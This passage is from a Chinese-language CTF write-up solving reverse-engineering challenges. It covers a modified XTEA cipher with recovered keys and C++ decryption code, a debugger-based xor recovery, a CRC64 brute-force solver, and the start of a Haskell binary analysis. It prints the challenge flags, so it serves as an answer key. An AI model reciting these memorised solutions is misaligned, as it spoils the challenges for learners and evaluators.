<span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">7</span>d7f9b9c = f4ef03ef</span><br><span class="line">W2 = W0 ^ W3 --- f4ef03ef ^ abab1212 = <span class="number">5</span>f4411fd</span><br><span class="line">W3 = W1 ^ W0 --- ad6d5cbd ^ <span class="number">5</span>f4411fd = f2294d40</span><br><span class="line">W2 = W1 + W0 --- f2294d40 + <span class="number">7e11907</span>e = <span class="number">1703</span>addbe</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">703</span>addbe &gt;&gt; <span class="number">4</span> = <span class="number">703</span>addb</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">703</span>addbe &lt;&lt; <span class="number">7</span> = <span class="number">381</span>d6edf00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">703</span>addb ^ <span class="number">1</span>d6edf00 = <span class="number">1</span>a6d72db</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">703</span>addbe ^ <span class="number">55667788</span> = <span class="number">255</span>caa36</span><br><span class="line">W2 = W1 + W0 --- <span class="number">1</span>a6d72db + <span class="number">255</span>caa36 = <span class="number">3</span>fca1d11</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- dcdf8283 &gt;&gt; b = <span class="number">1</span>b9bf0</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1</span>b9bf0 &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + dcdf8283 = <span class="number">1544</span>eead6</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">544</span>eead6 ^ <span class="number">23235566</span> = <span class="number">776</span>dbfb0</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">776</span>dbfb0 ^ <span class="number">3</span>fca1d11 = <span class="number">48</span>a7a2a1</span><br><span class="line">W2 = W1 + W0 --- <span class="number">48</span>a7a2a1 + bfed8b20 = <span class="number">108952</span>dc1</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">8952</span>dc1 &gt;&gt; <span class="number">5</span> = <span class="number">44</span>a96e</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">8952</span>dc1 &lt;&lt; <span class="number">6</span> = <span class="number">2254</span>b7040</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">44</span>a96e ^ <span class="number">254</span>b7040 = <span class="number">250</span>fd92e</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">8952</span>dc1 ^ <span class="number">11223344</span> = <span class="number">19</span>b<span class="number">71e85</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">250</span>fd92e + <span class="number">19</span>b<span class="number">71e85</span> = <span class="number">3</span>ec6f7b3</span><br><span class="line">W2 = W0 &amp; W3 --- dcdf8283 &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + dcdf8283 = <span class="number">15148e7</span>e7</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">5148e7</span>e7 ^ abab1212 = fae3f5f5</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">3</span>ec6f7b3 ^ fae3f5f5 = c4250246</span><br><span class="line">W2 = W1 + W0 --- c4250246 + <span class="number">703</span>addbe = <span class="number">1345</span>fe004</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">345</span>fe004 &gt;&gt; <span class="number">4</span> = <span class="number">345</span>fe00</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">345</span>fe004 &lt;&lt; <span class="number">7</span> = <span class="number">1</span>a2ff00200</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">345</span>fe00 ^ <span class="number">2</span>ff00200 = <span class="number">2</span>cb5fc00</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">345</span>fe004 ^ <span class="number">55667788</span> = <span class="number">6139978</span>c</span><br><span class="line">W2 = W1 + W0 --- <span class="number">2</span>cb5fc00 + <span class="number">6139978</span>c = <span class="number">8</span>def938c</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">3</span>c3f696a &gt;&gt; b = <span class="number">787</span>ed</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">787</span>ed &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">3</span>c3f696a = a1aacad7</span><br><span class="line">W2 = W0 ^ W3 --- a1aacad7 ^ <span class="number">23235566</span> = <span class="number">82899</span>fb1</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">82899</span>fb1 ^ <span class="number">8</span>def938c = f660c3d</span><br><span class="line">W2 = W1 + W0 --- f660c3d + <span class="number">8952</span>dc1 = <span class="number">17</span>fb39fe</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">17</span>fb39fe &gt;&gt; <span class="number">5</span> = bfd9cf</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">17</span>fb39fe &lt;&lt; <span class="number">6</span> = <span class="number">5</span>fece7f80</span><br><span class="line">W3 = W1 ^ W0 --- bfd9cf ^ fece7f80 = fe71a64f</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">17</span>fb39fe ^ <span class="number">11223344</span> = <span class="number">6</span>d90aba</span><br><span class="line">W2 = W1 + W0 --- fe71a64f + <span class="number">6</span>d90aba = <span class="number">1054</span>ab109</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">3</span>c3f696a &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">3</span>c3f696a = <span class="number">9</span>dacc8dc</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">9</span>dacc8dc ^ abab1212 = <span class="number">3607</span>dace</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">54</span>ab109 ^ <span class="number">3607</span>dace = <span class="number">334</span>d6bc7</span><br><span class="line">W2 = W1 + W0 --- <span class="number">334</span>d6bc7 + <span class="number">345</span>fe004 = <span class="number">67</span>ad4bcb</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">67</span>ad4bcb &gt;&gt; <span class="number">4</span> = <span class="number">67</span>ad4bc</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">67</span>ad4bcb &lt;&lt; <span class="number">7</span> = <span class="number">33</span>d6a<span class="number">5e580</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">67</span>ad4bc ^ d6a<span class="number">5e580</span> = d0df313c</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">67</span>ad4bcb ^ <span class="number">55667788</span> = <span class="number">32</span>cb3c43</span><br><span class="line">W2 = W1 + W0 --- d0df313c + <span class="number">32</span>cb3c43 = <span class="number">103</span>aa6d7f</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">9</span>b9f5051 &gt;&gt; b = <span class="number">1373</span>ea</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1373</span>ea &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">9</span>b9f5051 = fd0cafc3</span><br><span class="line">W2 = W0 ^ W3 --- fd0cafc3 ^ <span class="number">23235566</span> = de2ffaa5</span><br><span class="line">W3 = W1 ^ W0 --- de2ffaa5 ^ <span class="number">3</span>aa6d7f = dd8597da</span><br><span class="line">W2 = W1 + W0 --- dd8597da + <span class="number">17</span>fb39fe = f580d1d8</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- f580d1d8 &gt;&gt; <span class="number">5</span> = <span class="number">7</span>ac068e</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- f580d1d8 &lt;&lt; <span class="number">6</span> = <span class="number">3</span>d60347600</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7</span>ac068e ^ <span class="number">60347600</span> = <span class="number">6798708</span>e</span><br><span class="line">W2 = W0 ^ W3 --- f580d1d8 ^ <span class="number">11223344</span> = e4a<span class="number">2e29</span>c</span><br><span class="line">W2 = W1 + W0 --- <span class="number">6798708</span>e + e4a<span class="number">2e29</span>c = <span class="number">14</span>c3b532a</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">9</span>b9f5051 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">9</span>b9f5051 = <span class="number">1010</span>ab1be</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">10</span>ab1be ^ abab1212 = aaa1a3ac</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">4</span>c3b532a ^ aaa1a3ac = e69af086</span><br><span class="line">W2 = W1 + W0 --- e69af086 + <span class="number">67</span>ad4bcb = <span class="number">14e483</span>c51</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">4e483</span>c51 &gt;&gt; <span class="number">4</span> = <span class="number">4e483</span>c5</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4e483</span>c51 &lt;&lt; <span class="number">7</span> = <span class="number">27241e2880</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">4e483</span>c5 ^ <span class="number">241e2880</span> = <span class="number">20</span>faab45</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">4e483</span>c51 ^ <span class="number">55667788</span> = <span class="number">1</span>b<span class="number">2e4</span>bd9</span><br><span class="line">W2 = W1 + W0 --- <span class="number">20</span>faab45 + <span class="number">1</span>b<span class="number">2e4</span>bd9 = <span class="number">3</span>c28f71e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- faff3738 &gt;&gt; b = <span class="number">1</span>f5fe6</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1</span>f5fe6 &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + faff3738 = <span class="number">15</span>c6c96aa</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">5</span>c6c96aa ^ <span class="number">23235566</span> = <span class="number">7</span>f4fc3cc</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7</span>f4fc3cc ^ <span class="number">3</span>c28f71e = <span class="number">436734</span>d2</span><br><span class="line">W2 = W1 + W0 --- <span class="number">436734</span>d2 + f580d1d8 = <span class="number">138e806</span>aa</span><br></pre></td></tr></table></figure>

<p>通过观察可以发现是一个魔改的XTea加密。</p>
<p>通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 <strong>{0x776f6853,0x656b616d,0x616d5f72,0x74696564}</strong> 以及delta值 <strong>0x5f5fe6e7</strong></p>
<p>写出对应加密的c++代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 += tmp2;</span><br><span class="line">        sum += delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 += tmp4;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x5f5fe6e7</span> * <span class="number">72</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 -= tmp4;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 -= tmp2;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提取chal程序中的密文，进行解密即可。</p>
<p>完整解密代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x5f5fe6e7</span> * <span class="number">72</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 -= tmp4;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 -= tmp2;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key[]&#123;</span><br><span class="line">        <span class="number">0x776f6853</span>,</span><br><span class="line">        <span class="number">0x656b616d</span>,</span><br><span class="line">        <span class="number">0x616d5f72</span>,</span><br><span class="line">        <span class="number">0x74696564</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Encflag[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x696C2E9A</span>, <span class="number">0x76ADE8E1</span>, <span class="number">0xE67D5CA4</span>, <span class="number">0x5C76BD38</span>,</span><br><span class="line">        <span class="number">0xB7AC0787</span>, <span class="number">0xBFEA0C65</span>, <span class="number">0x01C2FF10</span>, <span class="number">0x6D16FD38</span>&#125;;</span><br><span class="line">    <span class="built_in">decipher</span>(Encflag, key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">8</span>), key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">16</span>), key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">24</span>), key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Encflag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>XYCTF{fun_un1c0rn_with_4rm64_VM}</p>
<h3 id="Moon"><a href="#Moon" class="headerlink" title="Moon"></a>Moon</h3><p>跟到moon.xor_crypt实际加密处。</p>
<p><img src="/.%5C6.png" loading="lazy"></p>
<p>发现是进行了单次xor，并加入到一个list中，前后过程不清楚。</p>
<p>断在xor这个命令，运行附加调试，随便输入一串1</p>
<p><img src="/.%5C7.png" loading="lazy"></p>
<p><img src="/.%5C8.png" loading="lazy"></p>
<p>发现是输入的’1’和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。</p>
<p>直接断在return处，v20是最后将list转成Bytes的结果。</p>
<p><img src="/.%5C9.png" loading="lazy"></p>
<p>发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。</p>
<p><img src="/.%5C10.png" loading="lazy"></p>
<p>继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。</p>
<p><img src="/.%5C11.png" loading="lazy"></p>
<p>v45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。</p>
<p><img src="/.%5C12.png" loading="lazy"></p>
<p>那么v9就应该是flag的密文，可以数出一共是要35字节。</p>
<p><img src="/.%5C13.png" loading="lazy"></p>
<p>重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。</p>
<p><img src="/.%5C14.png" loading="lazy"></p>
<p><img src="/.%5C15.png" loading="lazy"></p>
<p><img src="/.%5C16.png" loading="lazy"></p>
<p>最后在RichCompare处就可以得到xor密文的列表。</p>
<p><img src="/.%5C17.png" loading="lazy"></p>
<p>将v9的密文与这个数据进行xor即可得到flag。</p>
<p><img src="/.%5C18.png" loading="lazy"></p>
<p>flag{but_y0u_l00k3d_up_@t_th3_mOOn}</p>
<h3 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h3><p>.bc 后缀 </p>
<p>反编译为LLVM IR</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis-<span class="number">17</span> Dragon.bc -o Dragon.ll</span><br></pre></td></tr></table></figure>

<p>分析得知为crc64，以两个为一组进行校验，直接爆破就行</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">calculate_crc64_direct</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">uint64_t</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> crc = <span class="number">0xFFFFFFFFFFFFFFFFULL</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint64_t</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        crc ^= ((<span class="type">uint64_t</span>)data[i] &lt;&lt; <span class="number">56</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint64_t</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (crc &amp; <span class="number">0x8000000000000000ULL</span>) &#123; </span><br><span class="line">                crc = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x42F0E1EBA9EA3693ULL</span>; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                crc = crc &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ~crc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> enc[<span class="number">12</span>] = &#123;</span><br><span class="line">       <span class="number">-2565957437423125689</span>, </span><br><span class="line">        <span class="number">224890624719110086</span>, </span><br><span class="line">        <span class="number">1357324823849588894</span>, </span><br><span class="line">        - <span class="number">8941695979231947288</span>, </span><br><span class="line">        - <span class="number">253413330424273460</span>, </span><br><span class="line">        - <span class="number">7817463785137710741</span>, </span><br><span class="line">        - <span class="number">5620500441869335673</span>, </span><br><span class="line">        <span class="number">984060876288820705</span>, </span><br><span class="line">        - <span class="number">6993555743080142153</span>, </span><br><span class="line">        - <span class="number">7892488171899690683</span>, </span><br><span class="line">        <span class="number">7190415315123037707</span>, </span><br><span class="line">        - <span class="number">7218240302740981077</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">25</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> flag_index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">12</span>; k++) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> target_crc = enc[k];</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c1 = <span class="number">32</span>; c1 &lt; <span class="number">127</span> &amp;&amp; !found; c1++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c2 = <span class="number">32</span>; c2 &lt; <span class="number">127</span> &amp;&amp; !found; c2++) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> test[<span class="number">2</span>] = &#123; c1, c2 &#125;;</span><br><span class="line">                <span class="type">uint64_t</span> crc = <span class="built_in">calculate_crc64_direct</span>(test, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (crc == target_crc) &#123;</span><br><span class="line">                    flag[flag_index++] = c1;</span><br><span class="line">                    flag[flag_index++] = c2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    flag[flag_index] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted flag: %s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Summer（5m10v3师傅解题）"><a href="#Summer（5m10v3师傅解题）" class="headerlink" title="Summer（5m10v3师傅解题）"></a>Summer（5m10v3师傅解题）</h3><p>haskell程序</p>
<p>函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算</p>
<p>浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点</p>
<p><img src="/.%5C31.png" loading="lazy"></p>
<p>ZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数</p>
<p><img src="/.%5C19.png" loading="lazy"></p>
<p>GHCziInternalziBase也是底层函数，主要关注两个参数</p>
<p><img src="/.%5C20.png" loading="lazy"></p>
<p>第一个参数的地址处的函数为打印字符串</p>
<p><img src="/.%5C21.png" loading="lazy"></p>
<p><img src="/.%5C22.png" loading="lazy"></p>
<p>GHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc<strong>，</strong>zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 “flagTable” 的长度（这里的”flagTable” 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）</p>
<p><img src="/.%5C23.png" loading="lazy"></p>
<p><img src="/.%5C24.png" loading="lazy"></p>
<p>我们这里就用flag进行测试，一方面是为了查看他的返回值</p>
<p><img src="/.%5C25.png" loading="lazy"></p>
<p>此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)</p>
<p><img src="/.%5C26.png" loading="lazy"></p>
<p>另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度</p>
<p><img src="/.%5C27.png" loading="lazy"></p>
<p><img src="/.%5C28.png" loading="lazy"></p>
